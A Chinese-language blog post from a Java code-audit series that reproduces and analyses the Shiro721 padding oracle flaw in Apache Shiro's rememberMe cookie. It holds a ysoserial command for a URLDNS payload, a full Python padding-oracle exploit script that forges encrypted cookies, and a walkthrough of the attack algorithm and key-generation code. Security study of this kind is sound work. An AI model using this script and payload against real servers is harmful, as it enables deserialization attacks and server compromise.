---
title: Shiro721流程分析
date: 2026-09-03 09:23:39
categories:
  - java代码审计
tags:
  - Java
  - Shiro
  - 反序列化
---

## Shiro721流程分析

在 Shiro550 漏洞中，Cookie 所使用的 AES 加密密钥为硬编码，所以我们可以构造恶意序列化数据并使用固定的 AES 密钥进行正确加密恶意序列发送给服务端，进而达到攻击的目的。但在该漏洞公布后，Shiro 官方修复了这一漏洞，将AES密钥修改成了动态生成。也就是说，对于每一个 Cookie，都是使用不同的密钥进行加解密的。

环境搭建部分跳过

## 0x02 漏洞复现

### 漏洞利用

漏洞影响版本是 1.2.5 <= Apache Shiro <= 1.4.1

Apache Shiro Padding Oracle Attack 的漏洞利用必须满足如下前提条件：

- 开启 rememberMe 功能；
- rememberMe 值使用 AES-CBC 模式解密；
- 能获取到正常 Cookie，即用户正常登录的 Cookie 值；
- 密文可控；

开始复现，首先

先正常登录进去，勾选上 rememberMe 选项：

![image-20260814165351290](/images/java-code-audit/12-shiro721流程分析/20260814165351528.png)

![image-20260814165416681](/images/java-code-audit/12-shiro721流程分析/20260814165416723.png)

刷新当前页面或访问 `/account` 页面，获取此时登录成功的 rememberMe 值：

![image-20260814165604895](/images/java-code-audit/12-shiro721流程分析/20260814165604982.png)

使用工具生成URLDNS验证payload

```shell
java -jar ysoserial.jar URLDNS "http://na0cej.dnslog.cn" > payload.class
```

使用github的exp进行编码

```python
#https://github.com/3ndz/Shiro-721  
# -*- coding: utf-8 -*-  
from paddingoracle import BadPaddingException, PaddingOracle  
from base64 import b64encode, b64decode  
from urllib import quote, unquote  
import requests  
import socket  
import time  
  
class PadBuster(PaddingOracle):  
    def __init__(self, **kwargs):  
        super(PadBuster, self).__init__(**kwargs)  
        self.session = requests.Session()  
        self.wait = kwargs.get('wait', 2.0)  
  
    def oracle(self, data, **kwargs):  
        somecookie = b64encode(b64decode(unquote(sys.argv[2])) + data)  
        self.session.cookies['rememberMe'] = somecookie  
        if self.session.cookies.get('JSESSIONID'):  
            del self.session.cookies['JSESSIONID']  
        while 1:  
            try:  
                response = self.session.get(sys.argv[1],  
                        stream=False, timeout=5, verify=False)  
                break  
            except (socket.error, requests.exceptions.RequestException):  
                logging.exception('Retrying request in %.2f seconds...',  
                                  self.wait)  
                time.sleep(self.wait)  
                continue  
  
        self.history.append(response)  
        if response.headers.get('Set-Cookie') is None or 'deleteMe' not in response.headers.get('Set-Cookie'):  
            logging.debug('No padding exception raised on %r', somecookie)  
            return  
        raise BadPaddingException  
  
  
if __name__ == '__main__':  
    import logging  
    import sys  
  
    if not sys.argv[3:]:  
        print 'Usage: %s <url> <somecookie value> <payload>' % (sys.argv[0], )  
        sys.exit(1)  
  
    logging.basicConfig(level=logging.DEBUG)  
    encrypted_cookie = b64decode(unquote(sys.argv[2]))  
    padbuster = PadBuster()  
    payload = open(sys.argv[3], 'rb').read()  
    enc = padbuster.encrypt(plaintext=payload, block_size=16)  
    print('rememberMe cookies:')  
    print(b64encode(enc))
```

或者用工具

![image-20260814171009610](/images/java-code-audit/12-shiro721流程分析/20260814171009823.png)

## 0x03 漏洞分析

### 

这里简单说下 Padding Oracle Attack 加密数据整体过程：

1. 选择一个明文 `P`，用来生成你想要的密文`C`；
2. 使用适当的 Padding 将字符串填充为块大小的倍数，然后将其拆分为从 1 到 N 的块；
3. 生成一个随机数据块（`C[n]` 表示最后一个密文块）；
4. 对于每一个明文块，从最后一块开始：
   1. 创建一个包括两块的密文C’，其是通过一个空块（00000…）与最近生成的密文块`C[n+1]`（如果是第一轮则是随机块）组合成的；
   2. 这步容易理解，就是Padding Oracle的基本攻击原理：修改空块的最后一个字节直至Padding Oracle没有出现错误为止，然后继续将最后一个字节设置为2并修改最后第二个字节直至Padding Oracle没有出现错误为止，依次类推，继续计算出倒数第3、4…个直至最后一个数据为止；
   3. 在计算完整个块之后，将它与明文块 `P[n]` 进行XOR一起创建 `C[n]`；
   4. 对后续的每个块重复上述过程（在新的密文块前添加一个空块，然后进行Padding Oracle爆破计算）；

简单地说，每一个密文块解密为一个未知值，然后与前一个密文块进行XOR。通过仔细选择前一个块，我们可以控制下一个块解密来得到什么。即使下一个块解密为一堆无用数据，但仍然能被XOR化为我们控制的值，因此可以设置为任何我们想要的值。

### 漏洞代码分析

#### 密钥生成

在 Shiro550 中，密钥是硬编码，就像下面这样

JAVA

```java
public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer<PrincipalCollection>();
        this.cipherService = new AesCipherService();
        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
    }
```

而在 Shiro721 中，密钥的生成方式变为了动态生成

JAVA

```java
public AbstractRememberMeManager() {
        this.serializer = new DefaultSerializer<PrincipalCollection>();
        AesCipherService cipherService = new AesCipherService();
        this.cipherService = cipherService;
        setCipherKey(cipherService.generateNewKey().getEncoded());
    }
```

我们可以跟进调试一下，断点下在 `org.apache.shiro.crypto.AbstractSymmetricCipherService#generateNewKey()` 下，shiro 通过 `generateNewKey()` 方法获取密钥，跟进

![image-20260814211640190](/images/java-code-audit/12-shiro721流程分析/20260814211640454.png)

这里获取到了一个随机数生成器 `SecureRandom`， 跟进 `init()`

往下看，这里 var4 是 `AESKeyGenerator`，跟进 `engineInit()` 方法，进行了 AES 算法的初始化。

![image-20260814211747919](/images/java-code-audit/12-shiro721流程分析/20260814211748000.png)